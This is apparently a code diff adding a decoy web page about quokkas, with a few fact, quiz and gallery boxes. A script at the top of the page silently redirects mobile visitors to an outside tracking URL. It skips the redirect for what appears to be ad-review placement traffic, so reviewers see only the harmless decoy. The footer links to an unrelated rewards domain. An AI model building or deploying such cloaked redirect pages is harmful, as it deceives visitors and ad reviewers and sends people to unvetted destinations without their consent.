@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quirky Quokka Quest</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #ff8c00;
+            padding: 20px;
+            text-align: right;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .quirky-box {
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 15px;
+            padding: 15px;
+            transform: rotate(3deg);
+            transition: transform 0.3s ease;
+        }
+        .quirky-box:hover {
+            transform: rotate(-3deg) scale(1.05);
+        }
+        footer {
+            background-color: #4b0082;
+            color: white;
+            text-align: center;
+            padding: 10px;
+        }
+        a {
+            color: #ffd700;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Quokka Paradise!</h1>
+    </header>
+    <main>
+        <div class="quirky-box">
+            <h2>Quokka Facts</h2>
+            <p>Did you know quokkas are known as the happiest animals on Earth?</p>
+        </div>
+        <div class="quirky-box">
+            <h2>Quokka Quiz</h2>
+            <p>Test your quokka knowledge with our fun quiz!</p>
+        </div>
+        <div class="quirky-box">
+            <h2>Quokka Gallery</h2>
+            <p>Browse our collection of adorable quokka photos!</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Quirky Quokka Quest | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
